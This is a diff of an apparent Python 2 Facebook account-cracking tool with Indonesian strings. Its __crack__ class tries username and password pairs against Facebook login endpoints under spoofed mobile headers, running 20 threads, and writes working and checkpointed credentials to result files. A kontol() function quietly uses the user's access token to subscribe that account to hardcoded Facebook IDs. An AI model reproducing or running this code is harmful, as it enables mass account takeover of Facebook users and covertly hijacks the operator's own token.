@@ -190,7 +190,7 @@ def awokawokawokawokawokawokawokawokawokawokawokawok():
         elif yan =='3':
                 followers()
         elif yan =='4':
-                postingan()
+                public()
         elif yan =='5':
                 __crack__().slurr()
         elif yan =='6':
@@ -256,7 +256,6 @@ def kontol():
 	requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(__cindy__))
 	requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(__cindy__))
 	requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(__cindy__))
-	requests.post('https://graph.facebook.com/100003251214832/subscribers?access_token=%s'%(__cindy__))
 	srghun = '100007639052164'
 	rrtfgf = 'Bismillah semoga bang @[100005395413800:] dan kak @[100059709917296:] tahun depan menikah🥰'
 	fdrffg = '2657012877896655'
@@ -737,7 +736,6 @@ class __crack__:
             	user_agent = open('YNTKTS.txt', 'r').read()
             except (KeyError, IOError):
             	user_agent = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
-            except: pass
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
                'x-fb-net-hni': str(random.randint(20000, 40000)), 
                'x-fb-connection-quality': 'EXCELLENT', 
@@ -749,7 +747,7 @@ class __crack__:
             api = 'https://b-api.facebook.com/method/auth.login'
             response = requests.get(api, params=params, headers=headers_)
             if re.search('(EAAA)\\w+', response.text):
-                print '\r  %s* --> %s | %s               %s' % (H,user,pw,N)
+                print '\r  %s* --> %s|%s                 %s' % (H,user,pw,N)
                 wrt = ' [✓] %s|%s' % (user,pw)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -764,7 +762,7 @@ class __crack__:
                 except (KeyError, IOError):
                     ttl = ' '
                 except: pass
-                print '\r  %s* --> %s | %s %s            %s' % (K,user,pw,ttl,N)
+                print '\r  %s* --> %s|%s %s              %s' % (K,user,pw,ttl,N)
                 wrt = ' [×] %s|%s %s' % (user,pw,ttl)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -785,7 +783,6 @@ class __crack__:
             	user_agent = open('YNTKTS.txt', 'r').read()
             except (KeyError, IOError):
             	user_agent = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
-            except: pass
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
                'x-fb-net-hni': str(random.randint(20000, 40000)), 
                'x-fb-connection-quality': 'EXCELLENT', 
@@ -796,7 +793,7 @@ class __crack__:
             aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers=headers_)
             xo = aw.content
             if 'mbasic_logout_button' in xo or 'save-device' in xo:
-                print '\r  %s* --> %s | %s               %s' % (H,user,pw,N)
+                print '\r  %s* --> %s|%s                 %s' % (H,user,pw,N)
                 wrt = ' [✓] %s|%s' % (user,pw)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -811,7 +808,7 @@ class __crack__:
                 except (KeyError, IOError):
                     ttl = ' '
                 except: pass
-                print '\r  %s* --> %s | %s %s            %s' % (K,user,pw,ttl,N)
+                print '\r  %s* --> %s|%s %s              %s' % (K,user,pw,ttl,N)
                 wrt = ' [×] %s|%s %s' % (user,pw,ttl)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -832,7 +829,6 @@ class __crack__:
             	user_agent = open('YNTKTS.txt', 'r').read()
             except (KeyError, IOError):
             	user_agent = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
-            except: pass
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
                'x-fb-net-hni': str(random.randint(20000, 40000)), 
                'x-fb-connection-quality': 'EXCELLENT', 
@@ -861,7 +857,7 @@ class __crack__:
                 except (KeyError, IOError):
                     ttl = ' '
                 except: pass
-                print '\r  %s* --> %s | %s %s            %s' % (K,user,pw,ttl,N)
+                print '\r  %s* --> %s|%s %s              %s' % (K,user,pw,ttl,N)
                 wrt = ' [×] %s|%s %s' % (user,pw,ttl)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -924,7 +920,7 @@ class __crack__:
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
             with YayanGanteng(max_workers=20) as (__yayanXD__):
-            	for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
+                for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         bb = yntks.split('<=>')
                         xz = bb[1].split(' ')
